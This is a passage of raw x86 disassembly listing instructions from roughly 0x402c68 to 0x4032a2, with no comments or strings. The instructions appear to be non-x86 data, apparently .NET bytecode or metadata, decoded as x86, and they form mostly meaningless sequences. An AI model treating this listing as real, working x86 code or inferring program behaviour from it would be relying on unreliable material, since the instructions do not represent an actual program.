  402c68:	add    BYTE PTR [eax],al
  402c6a:	or     ch,BYTE PTR [eax]
  402c6c:	pop    ebx
  402c6d:	add    BYTE PTR [eax],al
  402c6f:	or     al,BYTE PTR [ebx]
  402c71:	sub    BYTE PTR [esi+0x0],bl
  402c74:	add    BYTE PTR [edx],cl
  402c76:	sub    al,BYTE PTR [eax]
  402c78:	adc    esi,DWORD PTR [eax]
  402c7a:	add    DWORD PTR [eax],eax
  402c7c:	adc    al,BYTE PTR [eax]
  402c7e:	add    BYTE PTR [eax],al
  402c80:	sldt   WORD PTR [eax]
  402c83:	adc    DWORD PTR [eax],ebp
  402c85:	pusha  
  402c86:	add    BYTE PTR [eax],al
  402c88:	or     ch,BYTE PTR [edi+0x61]
  402c8b:	add    BYTE PTR [eax],al
  402c8d:	or     cl,BYTE PTR [edx]
  402c8f:	push   es
  402c90:	outs   dx,DWORD PTR ds:[esi]
  402c91:	bound  eax,QWORD PTR [eax]
  402c93:	add    BYTE PTR [edx],cl
  402c95:	sub    al,BYTE PTR [eax]
  402c97:	add    BYTE PTR [ebx],dl
  402c99:	xor    BYTE PTR [ecx],al
  402c9b:	add    BYTE PTR [edi],dl
  402c9d:	add    BYTE PTR [eax],al
  402c9f:	add    BYTE PTR [edi],cl
  402ca1:	add    BYTE PTR [eax],al
  402ca3:	adc    DWORD PTR [eax],ebp
  402ca5:	pusha  
  402ca6:	add    BYTE PTR [eax],al
  402ca8:	or     ch,BYTE PTR [edi+0x61]
  402cab:	add    BYTE PTR [eax],al
  402cad:	or     cl,BYTE PTR [edx]
  402caf:	push   es
  402cb0:	outs   dx,DWORD PTR ds:[esi]
  402cb1:	arpl   WORD PTR [eax],ax
  402cb3:	add    BYTE PTR [edx],cl
  402cb5:	outs   dx,DWORD PTR ds:[esi]
  402cb6:	and    al,0x0
  402cb8:	add    BYTE PTR [edx],cl
  402cba:	sub    al,BYTE PTR [eax]
  402cbc:	sbb    esi,DWORD PTR [eax]
  402cbe:	add    DWORD PTR [eax],eax
  402cc0:	adc    BYTE PTR [eax],al
  402cc2:	add    BYTE PTR [eax],al
  402cc4:	push   cs
  402cc5:	add    BYTE PTR [eax],al
  402cc7:	adc    DWORD PTR [edi],ebx
  402cc9:	push   eax
  402cca:	or     ch,BYTE PTR [eax]
  402ccc:	add    BYTE PTR fs:[eax],al
  402ccf:	or     cl,BYTE PTR [edx]
  402cd1:	fiadd  WORD PTR [ebx]
  402cd3:	fiadd  WORD PTR es:[eax]
  402cd6:	push   es
  402cd7:	sub    al,BYTE PTR [ecx]
  402cd9:	adc    BYTE PTR [eax],al
  402cdb:	add    BYTE PTR [eax],al
  402cdd:	add    BYTE PTR [ebx],al
  402cdf:	add    BYTE PTR [eax],cl
  402ce1:	or     eax,DWORD PTR [eax]
  402ce3:	add    ecx,DWORD PTR [eax]
  402ce5:	add    BYTE PTR [eax],al
  402ce7:	add    DWORD PTR [esi],ebx
  402ce9:	add    ch,BYTE PTR [eax]
  402ceb:	sbb    DWORD PTR [eax],eax
  402ced:	add    BYTE PTR [edx],cl
  402cef:	sub    al,BYTE PTR [esi+0x172802]
  402cf5:	add    BYTE PTR [edx],cl
  402cf7:	add    al,BYTE PTR [ebx]
  402cf9:	jge    0x402d0e
  402cfb:	add    BYTE PTR [eax],al
  402cfd:	add    al,0x2
  402cff:	add    al,0x28
  402d01:	mov    ah,0x0
  402d03:	add    BYTE PTR [esi],al
  402d05:	jge    0x402d1b
  402d07:	add    BYTE PTR [eax],al
  402d09:	add    al,0x2
  402d0b:	add    eax,0x157d
  402d10:	add    al,0x2a
  402d12:	dec    edx
  402d13:	add    al,BYTE PTR [ebx]
  402d15:	add    al,0x5
  402d17:	sub    BYTE PTR ds:0x2060000,dh
  402d1d:	push   cs
  402d1e:	add    al,0x7d
  402d20:	push   ss
  402d21:	add    BYTE PTR [eax],al
  402d23:	add    al,0x2a
  402d25:	push   ds
  402d26:	add    bh,BYTE PTR [ebx+0x15]
  402d29:	add    BYTE PTR [eax],al
  402d2b:	add    al,0x2a
  402d2d:	inc    esi
  402d2e:	add    bh,BYTE PTR [ebx+0x16]
  402d31:	add    BYTE PTR [eax],al
  402d33:	add    al,0x25
  402d35:	sub    eax,0x7b022607
  402d3a:	adc    eax,DWORD PTR [eax]
  402d3c:	add    BYTE PTR [edx+ebp*1],al
  402d3f:	push   ds
  402d40:	add    bh,BYTE PTR [ebx+0x14]
  402d43:	add    BYTE PTR [eax],al
  402d45:	add    al,0x2a
  402d47:	mov    dh,0x2
  402d49:	pop    ss
  402d4a:	jge    0x402d64
  402d4c:	add    BYTE PTR [eax],al
  402d4e:	add    al,0x2
  402d50:	jae    0x402db8
  402d52:	add    BYTE PTR [eax],al
  402d54:	or     bh,BYTE PTR [ebp+0x19]
  402d57:	add    BYTE PTR [eax],al
  402d59:	add    al,0x2
  402d5b:	sub    BYTE PTR [ecx],bl
  402d5d:	add    BYTE PTR [eax],al
  402d5f:	or     al,BYTE PTR [edx]
  402d61:	add    al,BYTE PTR [ebx]
  402d63:	sub    BYTE PTR [eax+0x0],al
  402d66:	add    BYTE PTR [esi],al
  402d68:	jge    0x402d81
  402d6a:	add    BYTE PTR [eax],al
  402d6c:	add    al,0x2
  402d6e:	add    al,0x28
  402d70:	cmp    eax,DWORD PTR [eax]
  402d72:	add    BYTE PTR [esi],al
  402d74:	sub    al,BYTE PTR [eax]
  402d76:	add    BYTE PTR [eax],al
  402d78:	adc    esi,DWORD PTR [eax]
  402d7a:	add    al,0x0
  402d7c:	test   DWORD PTR [eax],eax
  402d7e:	add    BYTE PTR [eax],al
  402d80:	adc    BYTE PTR [eax],al
  402d82:	add    BYTE PTR [ecx],dl
  402d84:	jae    0x402dec
  402d86:	add    BYTE PTR [eax],al
  402d88:	or     cl,BYTE PTR [edx]
  402d8a:	push   ss
  402d8b:	or     ebp,DWORD PTR [ebx]
  402d8d:	gs pop es
  402d8f:	add    ebx,DWORD PTR [eax+0xc]
  402d92:	or     BYTE PTR [edx],al
  402d94:	jnp    0x402dad
  402d96:	add    BYTE PTR [eax],al
  402d98:	add    al,0x6f
  402d9a:	aas    
  402d9b:	add    BYTE PTR [eax],al
  402d9d:	or     dh,BYTE PTR [edx]
  402d9f:	sub    eax,0x177b02
  402da4:	add    BYTE PTR [edi+ebp*2],al
  402da7:	aas    
  402da8:	add    BYTE PTR [eax],al
  402daa:	or     dl,BYTE PTR [edi]
  402dac:	pop    ecx
  402dad:	or     al,0x2b
  402daf:	add    bh,BYTE PTR cs:[ebx+0x17]
  402db3:	add    BYTE PTR [eax],al
  402db5:	add    al,0x8
  402db7:	outs   dx,DWORD PTR ds:[esi]
  402db8:	inc    eax
  402db9:	add    BYTE PTR [eax],al
  402dbb:	or     ch,BYTE PTR [eax]
  402dbd:	add    BYTE PTR [bx+si],al
  402dc0:	or     ch,BYTE PTR [esi+eax*1]
  402dc3:	or     BYTE PTR [edi],dl
  402dc5:	pop    ecx
  402dc6:	or     al,0x2b
  402dc8:	or     BYTE PTR [eax],cl
  402dca:	pop    ss
  402dcb:	pop    ecx
  402dcc:	or     al,0x8
  402dce:	pop    es
  402dcf:	das    
  402dd0:	fisttp WORD PTR [eax]
  402dd2:	pop    es
  402dd3:	das    
  402dd4:	or     DWORD PTR [edx],eax
  402dd6:	push   ss
  402dd7:	jge    0x402df1
  402dd9:	add    BYTE PTR [eax],al
  402ddb:	add    al,0x2b
  402ddd:	and    eax,DWORD PTR [edi]
  402ddf:	or     BYTE PTR [eax],dh
  402de1:	adc    DWORD PTR [esi],eax
  402de3:	pop    es
  402de4:	or     BYTE PTR [ebx+0x41],dh
  402de7:	add    BYTE PTR [eax],al
  402de9:	push   es
  402dea:	outs   dx,DWORD PTR ds:[esi]
  402deb:	push   0x80a0000
  402df0:	sbb    BYTE PTR [eax+0xb],bl
  402df3:	pop    es
  402df4:	add    bh,BYTE PTR [ebx+0x17]
  402df7:	add    BYTE PTR [eax],al
  402df9:	add    al,0x6f
  402dfb:	aas    
  402dfc:	add    BYTE PTR [eax],al
  402dfe:	or     dh,BYTE PTR [edx]
  402e00:	lea    eax,[edx]
  402e02:	push   es
  402e03:	jge    0x402e1e
  402e05:	add    BYTE PTR [eax],al
  402e07:	add    al,0x2a
  402e09:	push   ds
  402e0a:	add    bh,BYTE PTR [ebx+0x18]
  402e0d:	add    BYTE PTR [eax],al
  402e0f:	add    al,0x2a
  402e11:	push   ds
  402e12:	add    bh,BYTE PTR [ebx+0x17]
  402e15:	add    BYTE PTR [eax],al
  402e17:	add    al,0x2a
  402e19:	xor    al,BYTE PTR [edx]
  402e1b:	jnp    0x402e36
  402e1d:	add    BYTE PTR [eax],al
  402e1f:	add    al,0x6f
  402e21:	imul   eax,DWORD PTR [eax],0x2a0a00
  402e27:	add    BYTE PTR [ebx],dl
  402e29:	xor    BYTE PTR [eax+eax*1],al
  402e2c:	xor    al,0x0
  402e2e:	add    BYTE PTR [eax],al
  402e30:	adc    DWORD PTR [eax],eax
  402e32:	add    BYTE PTR [ecx],dl
  402e34:	add    bh,BYTE PTR [ebx+0x17]
  402e37:	add    BYTE PTR [eax],al
  402e39:	add    al,0x2
  402e3b:	jnp    0x402e56
  402e3d:	add    BYTE PTR [eax],al
  402e3f:	add    al,0x3
  402e41:	outs   dx,DWORD PTR ds:[esi]
  402e42:	push   0x0
  402e44:	add    BYTE PTR [edx],cl
  402e46:	or     dl,BYTE PTR [edx]
  402e48:	add    BYTE PTR [eax],ch
  402e4a:	inc    edx
  402e4b:	add    BYTE PTR [eax],al
  402e4d:	push   es
  402e4e:	add    bh,BYTE PTR [ebx+0x19]
  402e51:	add    BYTE PTR [eax],al
  402e53:	add    al,0x3
  402e55:	outs   dx,DWORD PTR ds:[esi]
  402e56:	push   0x0
  402e58:	add    BYTE PTR [edx],cl
  402e5a:	or     edx,DWORD PTR [edx]
  402e5c:	add    DWORD PTR [eax],ebp
  402e5e:	inc    esp
  402e5f:	add    BYTE PTR [eax],al
  402e61:	push   es
  402e62:	outs   dx,DWORD PTR ds:[esi]
  402e63:	inc    ebx
  402e64:	add    BYTE PTR [eax],al
  402e66:	or     ch,BYTE PTR [edx]
  402e68:	sbb    esi,DWORD PTR [eax]
  402e6a:	add    al,0x0
  402e6c:	test   DWORD PTR [eax],0x120000
  402e72:	add    BYTE PTR [ecx],dl
  402e74:	jae    0x402edc
  402e76:	add    BYTE PTR [eax],al
  402e78:	or     cl,BYTE PTR [edx]
  402e7a:	push   ss
  402e7b:	or     edx,DWORD PTR [esi]
  402e7d:	or     al,0x16
  402e7f:	or     eax,0x2b041317
  402e84:	inc    ebp
  402e85:	add    ecx,DWORD PTR [eax]
  402e87:	outs   dx,DWORD PTR ds:[esi]
  402e88:	inc    eax
  402e89:	add    BYTE PTR [eax],al
  402e8b:	or     ch,BYTE PTR [eax]
  402e8d:	add    BYTE PTR [bx+si],al
  402e90:	or     ch,BYTE PTR [esi+ebp*1]
  402e93:	or     DWORD PTR [edx+ecx*1],ebp
  402e96:	adc    DWORD PTR [ebp*1+0x58170806],eax
  402e9d:	or     ebp,DWORD PTR [ebx]
  402e9f:	sbb    eax,0x111a2c09
  402ea4:	add    al,0x2c
  402ea6:	push   ss
  402ea7:	push   es
  402ea8:	pop    es
  402ea9:	or     BYTE PTR [edi],dl
  402eab:	pop    ecx
  402eac:	jae    0x402eef
  402eae:	add    BYTE PTR [eax],al
  402eb0:	push   es
  402eb1:	outs   dx,DWORD PTR ds:[esi]
  402eb2:	push   0x80a0000
  402eb7:	pop    ss
  402eb8:	pop    eax
  402eb9:	or     edx,DWORD PTR [esi]
  402ebb:	adc    eax,DWORD PTR [edi+edx*1]
  402ebe:	or     eax,0xd16052b
  402ec3:	pop    ss
  402ec4:	adc    eax,DWORD PTR [eax+ecx*1]
  402ec7:	pop    ss
  402ec8:	pop    eax
  402ec9:	or     al,0x8
  402ecb:	add    ebp,DWORD PTR [edi+0x3f]
  402ece:	add    BYTE PTR [eax],al
  402ed0:	or     dh,BYTE PTR [edx]
  402ed2:	mov    dl,0x11
  402ed4:	add    al,0x2c
  402ed6:	adc    al,0x6
  402ed8:	pop    es
  402ed9:	add    ebp,DWORD PTR [edi+0x3f]
  402edc:	add    BYTE PTR [eax],al
  402ede:	or     dl,BYTE PTR [edi]
  402ee0:	pop    ecx
  402ee1:	jae    0x402f24
  402ee3:	add    BYTE PTR [eax],al
  402ee5:	push   es
  402ee6:	outs   dx,DWORD PTR ds:[esi]
  402ee7:	push   0x60a0000
  402eec:	outs   dx,DWORD PTR ds:[esi]
  402eed:	imul   eax,DWORD PTR [eax],0x33170a00
  402ef3:	sbb    al,BYTE PTR [esi]
  402ef5:	push   ss
  402ef6:	outs   dx,DWORD PTR ds:[esi]
  402ef7:	push   0x0
  402ef9:	add    BYTE PTR [edx],cl
  402efb:	adc    eax,DWORD PTR [edi]
  402efd:	adc    al,BYTE PTR [edi]
  402eff:	sub    BYTE PTR [eax+eax*1+0x0],al
  402f03:	push   es
  402f04:	add    ebp,DWORD PTR [edi+0x3f]
  402f07:	add    BYTE PTR [eax],al
  402f09:	or     dh,BYTE PTR [ebx]
  402f0b:	add    al,BYTE PTR [ebx]
  402f0d:	sub    al,BYTE PTR [ebx]
  402f0f:	outs   dx,DWORD PTR ds:[esi]
  402f10:	aas    
  402f11:	add    BYTE PTR [eax],al
  402f13:	or     dh,BYTE PTR [ebx+0x6b]
  402f16:	add    BYTE PTR [eax],al
  402f18:	or     dl,BYTE PTR [ebx]
  402f1a:	add    eax,0x6c6f06
  402f1f:	add    BYTE PTR [edx],cl
  402f21:	adc    ecx,DWORD PTR [eax]
  402f23:	sub    esp,DWORD PTR ds:0x6d280812
  402f29:	add    BYTE PTR [eax],al
  402f2b:	or     dl,BYTE PTR [ebx]
  402f2d:	push   es
  402f2e:	adc    DWORD PTR ds:0x28061203,eax
  402f34:	inc    edx
  402f35:	add    BYTE PTR [eax],al
  402f37:	push   es
  402f38:	adc    al,BYTE PTR [esi]
  402f3a:	sub    BYTE PTR [eax+eax*1+0x0],al
  402f3e:	push   es
  402f3f:	outs   dx,DWORD PTR ds:[esi]
  402f40:	inc    ebx
  402f41:	add    BYTE PTR [eax],al
  402f43:	or     ch,BYTE PTR [edi+0x2c]
  402f46:	add    BYTE PTR [eax],al
  402f48:	or     ah,BYTE PTR [esi]
  402f4a:	adc    cl,BYTE PTR [eax]
  402f4c:	sub    BYTE PTR [esi+0x0],ch
  402f4f:	add    BYTE PTR [edx],cl
  402f51:	sub    eax,0x120eded2
  402f56:	or     dh,bh
  402f58:	push   ss
  402f59:	adc    DWORD PTR [eax],eax
  402f5b:	add    BYTE PTR [ebx],bl
  402f5d:	outs   dx,DWORD PTR ds:[esi]
  402f5e:	daa    
  402f5f:	add    BYTE PTR [eax],al
  402f61:	or     bl,ah
  402f63:	adc    DWORD PTR ds:0x246f,eax
  402f69:	or     ch,BYTE PTR [edx]
  402f6b:	add    BYTE PTR [ecx],al
  402f6d:	adc    BYTE PTR [eax],al
  402f6f:	add    BYTE PTR [edx],al
  402f71:	add    BYTE PTR [edi+0xe13200],ch
  402f77:	push   cs
  402f78:	add    BYTE PTR [eax],al
  402f7a:	add    BYTE PTR [eax],al
  402f7c:	add    al,BYTE PTR ds:[ebx]
  402f7f:	jge    0x402f9b
  402f81:	add    BYTE PTR [eax],al
  402f83:	add    al,0x2
  402f85:	add    al,0x7d
  402f87:	sbb    eax,DWORD PTR [eax]
  402f89:	add    BYTE PTR [edx+ebp*1],al
  402f8c:	push   ds
  402f8d:	add    bh,BYTE PTR [ebx+0x1a]
  402f90:	add    BYTE PTR [eax],al
  402f92:	add    al,0x2a
  402f94:	push   ds
  402f95:	add    bh,BYTE PTR [ebx+0x1b]
  402f98:	add    BYTE PTR [eax],al
  402f9a:	add    al,0x2a
  402f9c:	inc    edx
  402f9d:	add    bh,BYTE PTR [ebx+0x1b]
  402fa0:	add    BYTE PTR [eax],al
  402fa2:	add    al,0x2
  402fa4:	jnp    0x402fc0
  402fa6:	add    BYTE PTR [eax],al
  402fa8:	add    al,0x59
  402faa:	pop    ss
  402fab:	pop    eax
  402fac:	sub    dl,BYTE PTR [esi+0x2]
  402faf:	sub    BYTE PTR [ecx],bl
  402fb1:	add    BYTE PTR [eax],al
  402fb3:	or     al,BYTE PTR [edx]
  402fb5:	add    edi,DWORD PTR [ebp+0x1f]
  402fb8:	add    BYTE PTR [eax],al
  402fba:	add    al,0x2
  402fbc:	add    al,0x7d
  402fbe:	and    BYTE PTR [eax],al
  402fc0:	add    BYTE PTR [edx+ebp*1],al
  402fc3:	push   ds
  402fc4:	add    bh,BYTE PTR [ebx+0x1f]
  402fc7:	add    BYTE PTR [eax],al
  402fc9:	add    al,0x2a
  402fcb:	inc    esi
  402fcc:	add    bh,BYTE PTR [ebx+0x20]
  402fcf:	add    BYTE PTR [eax],al
  402fd1:	add    al,0x28
  402fd3:	xor    DWORD PTR [eax],eax
  402fd5:	add    BYTE PTR [esi],al
  402fd7:	outs   dx,DWORD PTR ds:[esi]
  402fd8:	jo     0x402fda
  402fda:	add    BYTE PTR [edx],cl
  402fdc:	sub    ah,BYTE PTR [edx]
  402fde:	add    dl,BYTE PTR [esi+edi*8]
  402fe1:	add    DWORD PTR [esi],edx
  402fe3:	inc    BYTE PTR [ecx]
  402fe5:	sub    al,BYTE PTR [eax]
  402fe7:	add    BYTE PTR [ebx],dl
  402fe9:	xor    BYTE PTR ds:0x5d00,al
  402fef:	add    BYTE PTR [ebx],dl
  402ff1:	add    BYTE PTR [eax],al
  402ff3:	adc    DWORD PTR [edx],eax
  402ff5:	jae    0x403069
  402ff7:	add    BYTE PTR [eax],al
  402ff9:	or     bh,BYTE PTR [ebp+0x24]
  402ffc:	add    BYTE PTR [eax],al
  402ffe:	add    al,0x2
  403000:	sub    BYTE PTR [ecx],bl
  403002:	add    BYTE PTR [eax],al
  403004:	or     al,BYTE PTR [edx]
  403006:	add    edi,DWORD PTR [ebp+0x25]
  403009:	add    BYTE PTR [eax],al
  40300b:	add    al,0x2
  40300d:	add    al,0x7d
  40300f:	add    BYTE PTR es:[eax],al
  403012:	add    al,0x2
  403014:	sbb    BYTE PTR [ebp+0x1000034],cl
  40301a:	or     al,BYTE PTR [esi]
  40301c:	push   ss
  40301d:	add    al,0xa2
  40301f:	push   es
  403020:	pop    ss
  403021:	add    eax,0x287e06a2
  403026:	add    BYTE PTR [eax],al
  403028:	add    al,0x2d
  40302a:	adc    DWORD PTR [esi+edi*8],edx
  40302d:	push   es
  40302e:	push   ebx
  40302f:	add    BYTE PTR [eax],al
  403031:	push   es
  403032:	jae    0x4030a7
  403034:	add    BYTE PTR [eax],al
  403036:	or     al,BYTE PTR [eax+0x4000028]
  40303c:	jle    0x403066
  40303e:	add    BYTE PTR [eax],al
  403040:	add    al,0x28
  403042:	add    DWORD PTR [eax],eax
  403044:	add    BYTE PTR [ebx],ch
  403046:	sub    BYTE PTR [edx],al
  403048:	add    BYTE PTR [eax],al
  40304a:	sub    edi,DWORD PTR [ebp+0x27]
  40304d:	add    BYTE PTR [eax],al
  40304f:	add    al,0x2a
  403051:	add    BYTE PTR [eax],al
  403053:	add    BYTE PTR [ebx],dl
  403055:	xor    BYTE PTR [eax+eax*1],al
  403058:	mov    es,WORD PTR [eax]
  40305a:	add    BYTE PTR [eax],al
  40305c:	adc    al,0x0
  40305e:	add    BYTE PTR [ecx],dl
  403060:	add    ebp,DWORD PTR [eax]
  403062:	jbe    0x403064
  403064:	add    BYTE PTR [edx],cl
  403066:	sub    al,0x44
  403068:	add    ebp,DWORD PTR [eax]
  40306a:	ja     0x40306c
  40306c:	add    BYTE PTR [edx],cl
  40306e:	or     al,BYTE PTR [edx]
  403070:	jnp    0x403099
  403072:	add    BYTE PTR [eax],al
  403074:	add    al,0x6
  403076:	sub    BYTE PTR [ebp+0x0],al
  403079:	add    BYTE PTR [edx],cl
  40307b:	sub    BYTE PTR [ebx],al
  40307d:	add    BYTE PTR [eax],al
  40307f:	sub    ebp,DWORD PTR ds:0x7b02061d
  403085:	and    eax,0x2040000
  40308a:	jnp    0x4030b2
  40308c:	add    BYTE PTR [eax],al
  40308e:	add    al,0x28
  403090:	popf   
  403091:	add    BYTE PTR [eax],al
  403093:	push   es
  403094:	and    BYTE PTR [esi+0x1b],bl
  403097:	add    BYTE PTR [eax],al
  403099:	jae    0x403045
  40309b:	add    BYTE PTR [eax],al
  40309d:	push   es
  40309e:	jp     0x4030a2
  4030a0:	jnp    0x4030c6
  4030a2:	add    BYTE PTR [eax],al
  4030a4:	add    al,0x3
  4030a6:	outs   dx,DWORD PTR ds:[esi]
  4030a7:	jns    0x4030a9
  4030a9:	add    BYTE PTR [edx],cl
  4030ab:	sub    al,BYTE PTR [ebx]
  4030ad:	sub    BYTE PTR [edx+0x0],bh
  4030b0:	add    BYTE PTR [edx],cl
  4030b2:	sub    al,0x23
  4030b4:	add    bh,BYTE PTR [ebx+0x24]
  4030b7:	add    BYTE PTR [eax],al
  4030b9:	add    al,0x3
  4030bb:	jb     0x40310a
  4030bd:	add    BYTE PTR [eax],al
  4030bf:	jo     0x4030c3
  4030c1:	jnp    0x4030e9
  4030c3:	add    BYTE PTR [eax],al
  4030c5:	add    al,0x28
  4030c7:	push   eax
  4030c8:	add    BYTE PTR [eax],al
  4030ca:	or     dl,BYTE PTR [esi]
  4030cc:	sub    BYTE PTR [ebx+0x0],bh
  4030cf:	add    BYTE PTR [edx],cl
  4030d1:	outs   dx,DWORD PTR ds:[esi]
  4030d2:	jl     0x4030d4
  4030d4:	add    BYTE PTR [edx],cl
  4030d6:	sub    al,BYTE PTR [ebx]
  4030d8:	add    bh,BYTE PTR [ebx+0x25]
  4030db:	add    BYTE PTR [eax],al
  4030dd:	add    al,0x28
  4030df:	pushf  
  4030e0:	add    BYTE PTR [eax],al
  4030e2:	push   es
  4030e3:	and    BYTE PTR [edi+0x1b],bl
  4030e6:	add    BYTE PTR [eax],al
  4030e8:	jae    0x403094
  4030ea:	add    BYTE PTR [eax],al
  4030ec:	push   es
  4030ed:	jp     0x403121
  4030ef:	add    bh,BYTE PTR [ebx+0x24]
  4030f2:	add    BYTE PTR [eax],al
  4030f4:	add    al,0x6f
  4030f6:	jge    0x4030f8
  4030f8:	add    BYTE PTR [edx],cl
  4030fa:	sub    dh,BYTE PTR [esi]
  4030fc:	add    bh,BYTE PTR [ebx+0x24]
  4030ff:	add    BYTE PTR [eax],al
  403101:	add    al,0x3
  403103:	outs   dx,DWORD PTR ds:[esi]
  403104:	jle    0x403106
  403106:	add    BYTE PTR [edx],cl
  403108:	sub    bh,BYTE PTR [edx]
  40310a:	add    bh,BYTE PTR [ebx+0x24]
  40310d:	add    BYTE PTR [eax],al
  40310f:	add    al,0x3
  403111:	add    al,0x6f
  403113:	jg     0x403115
  403115:	add    BYTE PTR [edx],cl
  403117:	sub    dh,BYTE PTR [edx]
  403119:	add    bh,BYTE PTR [ebx+0x24]
  40311c:	add    BYTE PTR [eax],al
  40311e:	add    al,0x6f
  403120:	add    BYTE PTR [eax],0x0
  403123:	or     ch,BYTE PTR [edx]
  403125:	xor    al,BYTE PTR [edx]
  403127:	jnp    0x40314d
  403129:	add    BYTE PTR [eax],al
  40312b:	add    al,0x6f
  40312d:	add    DWORD PTR [eax],0x362a0a00
  403133:	add    bh,BYTE PTR [ebx+0x24]
  403136:	add    BYTE PTR [eax],al
  403138:	add    al,0x3
  40313a:	outs   dx,DWORD PTR ds:[esi]
  40313b:	add    BYTE PTR [eax],0x0
  40313e:	or     ch,BYTE PTR [edx]
  403140:	inc    esi
  403141:	add    bh,BYTE PTR [ebx+0x24]
  403144:	add    BYTE PTR [eax],al
  403146:	add    al,0x6f
  403148:	add    DWORD PTR [eax],0x0
  40314b:	or     cl,BYTE PTR [ebp+edx*1+0x2a1b0000]
  403152:	inc    esi
  403153:	add    bh,BYTE PTR [ebx+0x24]
  403156:	add    BYTE PTR [eax],al
  403158:	add    al,0x6f
  40315a:	add    DWORD PTR [eax],0x0
  40315d:	or     cl,BYTE PTR [ebp+edx*1+0x2a1b0000]
  403164:	add    bh,BYTE PTR ss:[ebx+0x24]
  403168:	add    BYTE PTR [eax],al
  40316a:	add    al,0x3
  40316c:	outs   dx,DWORD PTR ds:[esi]
  40316d:	test   BYTE PTR [eax],al
  40316f:	add    BYTE PTR [edx],cl
  403171:	sub    al,BYTE PTR [eax]
  403173:	add    BYTE PTR [ebx],bl
  403175:	xor    BYTE PTR [esi],al
  403177:	add    bh,ch
  403179:	add    BYTE PTR [eax],al
  40317b:	add    BYTE PTR ds:0x28110000,dl
  403181:	xchg   BYTE PTR [eax],al
  403183:	add    BYTE PTR [edx],cl
  403185:	sub    BYTE PTR [edi+0x6f0a0000],al
  40318b:	mov    BYTE PTR [eax],al
  40318d:	add    BYTE PTR [edx],cl
  40318f:	outs   dx,DWORD PTR ds:[esi]
  403190:	mov    DWORD PTR [eax],eax
  403192:	add    BYTE PTR [edx],cl
  403194:	sub    BYTE PTR [edx+0x6f0a0000],cl
  40319a:	mov    eax,DWORD PTR [eax]
  40319c:	add    BYTE PTR [edx],cl
  40319e:	or     al,BYTE PTR [esi]
  4031a0:	and    cl,ch
  4031a2:	std    
  4031a3:	add    BYTE PTR [eax],al
  4031a5:	cs inc edx
  4031a7:	push   es
  4031a8:	sub    BYTE PTR [esi+0x6f0a0000],al
  4031ae:	mov    WORD PTR [eax],es
  4031b0:	add    BYTE PTR [edx],cl
  4031b2:	outs   dx,DWORD PTR ds:[esi]
  4031b3:	lea    eax,[eax]
  4031b5:	add    BYTE PTR [edx],cl
  4031b7:	outs   dx,DWORD PTR ds:[esi]
  4031b8:	mov    es,WORD PTR [eax]
  4031ba:	add    BYTE PTR [edx],cl
  4031bc:	sub    eax,DWORD PTR cs:[esi]
  4031bf:	sub    BYTE PTR [esi+0x6f0a0000],al
  4031c5:	mov    WORD PTR [eax],es
  4031c7:	add    BYTE PTR [edx],cl
  4031c9:	outs   dx,DWORD PTR ds:[esi]
  4031ca:	lea    eax,[eax]
  4031cc:	add    BYTE PTR [edx],cl
  4031ce:	outs   dx,DWORD PTR ds:[esi]
  4031cf:	pop    DWORD PTR [eax]
  4031d1:	add    BYTE PTR [edx],cl
  4031d3:	cs adc al,0x28
  4031d6:	xchg   BYTE PTR [eax],al
  4031d8:	add    BYTE PTR [edx],cl
  4031da:	jb     0x40322d
  4031dc:	add    BYTE PTR [eax],al
  4031de:	jo     0x403253
  4031e0:	nop
  4031e1:	add    BYTE PTR [eax],al
  4031e3:	or     ch,BYTE PTR [edi-0x77]
  4031e6:	add    BYTE PTR [eax],al
  4031e8:	or     bh,BYTE PTR [esi+0x2e]
  4031eb:	add    BYTE PTR [eax],al
  4031ed:	add    al,0x2
  4031ef:	outs   dx,DWORD PTR ds:[esi]
  4031f0:	and    DWORD PTR [eax],eax
  4031f2:	add    BYTE PTR [esi],al
  4031f4:	or     eax,DWORD PTR [edi]
  4031f6:	pop    ss
  4031f7:	xor    eax,DWORD PTR ds:0xde051316
  4031fd:	outs   dx,BYTE PTR ds:[esi]
  4031fe:	jle    0x40322e
  403200:	add    BYTE PTR [eax],al
  403202:	add    al,0x6f
  403204:	je     0x403206
  403206:	add    BYTE PTR [esi],al
  403208:	jle    0x403238
  40320a:	add    BYTE PTR [eax],al
  40320c:	add    al,0x6f
  40320e:	push   0x13060000
  403213:	push   es
  403214:	adc    DWORD PTR [esi],eax
  403216:	sbb    esi,DWORD PTR [ebx]
  403218:	add    eax,0x5528
  40321d:	push   es
  40321e:	fidivr WORD PTR [ecx]
  403220:	or     al,0x14
  403222:	adc    eax,0x916f0815
  403227:	add    BYTE PTR [eax],al
  403229:	or     cl,BYTE PTR [eax]
  40322b:	outs   dx,DWORD PTR ds:[esi]
  40322c:	stos   DWORD PTR es:[edi],eax
  40322d:	add    BYTE PTR [eax],al
  40322f:	push   es
  403230:	pop    ss
  403231:	sub    BYTE PTR [esi+0x0],bl
  403234:	add    BYTE PTR [esi],al
  403236:	pop    ss
  403237:	adc    eax,DWORD PTR ds:0xde2631de
  40323d:	sbb    ecx,DWORD PTR ds:0x602809
  403243:	add    BYTE PTR [esi],al
  403245:	adc    eax,DWORD PTR [esp+edx*1]
  403248:	adc    eax,0x20041115
  40324d:	pop    ecx
  40324e:	sbb    eax,DWORD PTR [eax]
  403250:	add    BYTE PTR [edi],dl
  403252:	sub    BYTE PTR [esi+0x0],bl
  403255:	add    BYTE PTR [esi],al
  403257:	fiadd  WORD PTR [eax]
  403259:	fiadd  WORD PTR [esi]
  40325b:	sub    BYTE PTR [edx-0x23f60000],dl
  403261:	sub    BYTE PTR [eax+eax*1+0x0],bl
  403265:	push   es
  403266:	jle    0x403295
  403268:	add    BYTE PTR [eax],al
  40326a:	add    al,0x2a
  40326c:	adc    DWORD PTR ds:0x3401002a,eax
  403272:	add    BYTE PTR [eax],al
  403274:	add    BYTE PTR [eax],al
  403276:	add    BYTE PTR [eax],al
  403278:	mov    al,ds:0x151b00a0
  40327d:	add    BYTE PTR [eax],al
  40327f:	add    al,BYTE PTR [eax]
  403281:	add    BYTE PTR [eax],al
  403283:	add    BYTE PTR [eax+0xe0300bb],ah
  403289:	add    BYTE PTR [eax],al
  40328b:	add    al,BYTE PTR [eax]
  40328d:	add    BYTE PTR [eax],al
  40328f:	add    BYTE PTR [eax+0x81b00be],ah
  403295:	add    BYTE PTR [eax],al
  403297:	add    DWORD PTR [edx],eax
  403299:	add    BYTE PTR [eax],al
  40329b:	add    bl,bl
  40329d:	fild   DWORD PTR [eax]
  40329f:	push   es
  4032a0:	add    BYTE PTR [eax],al
  4032a2:	add    BYTE PTR [eax],al
